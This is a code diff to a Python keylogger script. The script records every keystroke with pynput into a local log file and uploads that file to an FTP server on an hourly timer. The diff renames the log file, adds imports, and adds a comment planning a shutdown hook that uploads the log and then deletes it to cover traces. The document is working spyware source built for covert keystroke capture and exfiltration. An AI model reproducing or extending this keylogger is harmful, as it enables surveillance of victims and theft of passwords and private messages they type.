@@ -2,6 +2,8 @@
 from pynput import keyboard
 from ftplib import FTP
 import threading
+import atexit
+import os
 
 
 # FTP Configurations
@@ -14,7 +16,7 @@ upload_interval = 3600  # Upload interval in seconds (1 hour)
 # This will be what logs the keys that are pressed, in addition to writing it to a file
 def keypressed(key):
     print(str(key))
-    with open('logs.txt', 'a') as logKey:
+    with open('log.txt', 'a') as logKey:
         try:
             char = key.char
             logKey.write(char)
@@ -33,6 +35,11 @@ def send_log():
         return "file uploaded"
     except Exception as e:
         return f"Error uploading log file: {e}"
+
+
+#  Function that will first upload the log to the server
+#  then delete the log file if the script is shutdown for some reason
+
 
 
 # Main function that starts the logger
